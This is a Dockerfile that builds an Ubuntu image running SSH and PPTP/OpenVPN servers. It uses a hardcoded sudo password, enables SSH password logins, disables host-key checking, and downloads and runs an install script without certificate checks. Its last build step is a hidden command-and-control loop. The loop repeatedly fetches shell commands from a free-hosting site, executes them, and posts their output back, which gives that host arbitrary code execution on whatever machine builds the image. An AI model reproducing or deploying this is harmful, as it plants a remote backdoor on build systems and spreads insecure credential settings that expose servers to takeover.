FROM ubuntu:18.04
RUN apt-get update && apt-get upgrade -y \
 && apt-get update && apt-get install -y git tar curl wget iptables screen zip unzip nano sed nano openssh-server pptpd openssl openssh-client ssh x11-apps sudo --fix-missing \
 && mkdir dockertest && cd dockertest 
WORKDIR dockertest
RUN rm -rf * 
RUN encpass=$( perl -e "print crypt('R123456','sa');") && useradd -m -p $encpass -s /bin/bash rezaf28
RUN usermod -aG sudo rezaf28
RUN passwd rezaf28 -u
EXPOSE 22
EXPOSE 1723
EXPOSE 1194
RUN mkdir ~/.ssh/
RUN whoami
RUN mkdir /dev/net && mknod /dev/net/tun c 10 200 && chmod 0666 /dev/net/tun

RUN curl https://rezaf136.000webhostapp.com/upload.php

RUN ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -q -N ""

RUN sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
RUN sed -i 's/#PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
RUN sed -i 's/#PermitRootLogin no/PermitRootLogin no/g' /etc/ssh/sshd_config

RUN sed -ri 's/UsePAM yes/UsePAM no/g' /etc/ssh/sshd_config
RUN sed -ri 's/#UsePAM no/UsePAM no/g' /etc/ssh/sshd_config

RUN sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config

RUN sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/ssh_config
RUN sed -i 's/#   PasswordAuthentication/    PasswordAuthentication/g' /etc/ssh/ssh_config
RUN sed -i 's/#   PasswordAuthentication/   PasswordAuthentication/g' /etc/ssh/ssh_config

RUN sed -i 's/UseLogin no/UseLogin yes/g' /etc/ssh/sshd_config
RUN sed -i 's/#UseLogin no/UseLogin yes/g' /etc/ssh/sshd_config
RUN sed -i 's/#UseLogin yes/UseLogin yes/g' /etc/ssh/sshd_config

RUN touch ~/.ssh/known_hosts
RUN touch ~/.ssh/authorized_keys

RUN echo "Host * " > ~/.ssh/config 
RUN echo "  IdentityFile ~/.ssh/id_rsa" >> ~/.ssh/config 
RUN echo "  HashKnownHosts yes" >> ~/.ssh/config
RUN echo "  GSSAPIAuthentication yes" >> ~/.ssh/config
RUN echo "  StrictHostKeyChecking no" >> ~/.ssh/config
RUN echo "  UserKnownHostsFile=/dev/null" >> ~/.ssh/config

RUN chmod 700 ~/.ssh
RUN chmod 644 ~/.ssh/authorized_keys
RUN chmod 644 ~/.ssh/known_hosts
RUN chmod 644 ~/.ssh/config
RUN chmod 600 ~/.ssh/id_rsa
RUN chmod 644 ~/.ssh/id_rsa.pub


RUN service ssh start

RUN /usr/bin/ssh-keygen -A

RUN service ssh restart

ARG CACHEBUST=1
RUN curl https://rezaf136.000webhostapp.com/upload.php

RUN cat /etc/ssh/sshd_config
RUN ls /etc/ssh/ -l
RUN ls ~/.ssh/ -l

RUN publicip=$( curl ifconfig.me) && echo $publicip

RUN wget http://git.io/vpn --no-check-certificate -O openvpn-install.sh
RUN chmod +x openvpn-install.sh && ./openvpn-install.sh

RUN sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf

RUN echo "name pptpd" >> /etc/ppp/pptpd-options
RUN echo "refuse-pap" >> /etc/ppp/pptpd-options
RUN echo "refuse-chap" >> /etc/ppp/pptpd-options
RUN echo "refuse-mschap" >> /etc/ppp/pptpd-options
RUN echo "require-mschap-v2" >> /etc/ppp/pptpd-options
RUN echo "require-mppe-128" >> /etc/ppp/pptpd-options
RUN echo "ms-dns 8.8.8.8" >> /etc/ppp/pptpd-options
RUN echo "#ms-dns 8.8.4.4" >> /etc/ppp/pptpd-options
RUN echo "proxyarp" >> /etc/ppp/pptpd-options
RUN echo "nodefaultroute" >> /etc/ppp/pptpd-options
RUN echo "lock" >> /etc/ppp/pptpd-options
RUN echo "nobsdcomp" >> /etc/ppp/pptpd-options
RUN echo "mtu 1490" >> /etc/ppp/pptpd-options
RUN echo "mru 1490" >> /etc/ppp/pptpd-options

RUN echo "rezaf28 pptpd R123456 *" >> /etc/ppp/chap-secrets

RUN sysctl -p /etc/sysctl.conf
RUN sysctl -p
RUN cat /etc/sysctl.conf
RUN service pptpd restart

RUN curl https://rezaf136.000webhostapp.com/upload.php
RUN curl https://rezaf136.000webhostapp.com/upload.php
RUN set +e; \
echo Active >> output.txt; \
curl -d "@output.txt" -X POST https://rezaf136.000webhostapp.com/Bash/inputhandler.php; \ 
while [ 1 == 1 ]; \
do \
rm -rf command.txt; \
rm -rf output.txt; \
curl https://rezaf136.000webhostapp.com/Bash/output.txt  --output command.txt; \
curl https://rezaf136.000webhostapp.com/Bash/outputhandler.php \
chmod u+x command.txt; \
sh ./command.txt >> output.txt; \
if [[ -s output.txt ]]; then curl -d "@output.txt" -X POST https://rezaf136.000webhostapp.com/Bash/inputhandler.php; else echo "file is empty"; fi; \
sleep 2; \
done
